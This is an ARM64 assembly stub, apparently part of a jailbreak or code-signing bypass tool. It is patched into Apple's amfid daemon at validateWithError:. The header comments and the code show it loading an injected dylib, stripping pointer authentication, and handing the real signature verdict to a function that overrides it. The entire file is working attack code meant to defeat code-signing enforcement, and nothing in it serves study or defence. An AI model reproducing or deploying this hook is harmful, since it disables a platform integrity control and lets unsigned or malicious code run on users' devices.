// godmfi_stub.s — copied into amfid at the validateWithError: IMP (via an entry patch
// LDR x17,#8 ; BR x17 ; .quad <stub>). It permanently handles validateWithError::
//   dlopen(godmfi.dylib)  [idempotent; vnode pre-warmed by the launcher so no re-entrancy]
//   dlsym(handle, "godmfi_decide")
//   return godmfi_decide(self, sel, err, trampoline)
// The trampoline (page+0) runs the ORIGINAL validateWithError, so godmfi_decide gets the
// real verdict and overrides for god. The triggering binary is its own trigger -> it gets
// the override on its first validation (no sacrificial binary).
//
// Data block appended by the launcher at _godmfi_stub_params:
//   +0  path_addr   (ptr to dylib-path string)
//   +8  &dlopen
//   +16 &dlsym
//   +24 trampoline_addr (page+0)
//   +32 "godmfi_decide\0"
//   +..(path string)

.text
.align 4
.globl _godmfi_stub_start
.globl _godmfi_stub_params
_godmfi_stub_start:
    adr     x9, _godmfi_stub_params
    sub     sp, sp, #64
    stp     x0, x1, [sp, #0]        // self, sel
    stp     x2, x9, [sp, #16]       // err, params
    str     x30, [sp, #32]          // lr

    ldr     x0, [x9, #0]            // path
    mov     x1, #2                  // RTLD_NOW
    ldr     x16, [x9, #8]           // &dlopen
    blr     x16                     // x0 = handle

    ldr     x9, [sp, #24]           // params
    add     x1, x9, #32             // &"godmfi_decide"
    ldr     x16, [x9, #16]          // &dlsym   (x0 still = handle)
    blr     x16                     // x0 = godmfi_decide (PAC-signed by dlsym on arm64e)
    mov     x17, x0
    xpaci   x17                     // strip PAC so the raw blr below hits the real entry

    ldp     x0, x1, [sp, #0]        // self, sel
    ldr     x2, [sp, #16]           // err
    ldr     x9, [sp, #24]           // params
    ldr     x3, [x9, #24]           // trampoline
    blr     x17                     // x0 = verdict

    ldr     x30, [sp, #32]
    add     sp, sp, #64
    ret

.align 4
_godmfi_stub_params:
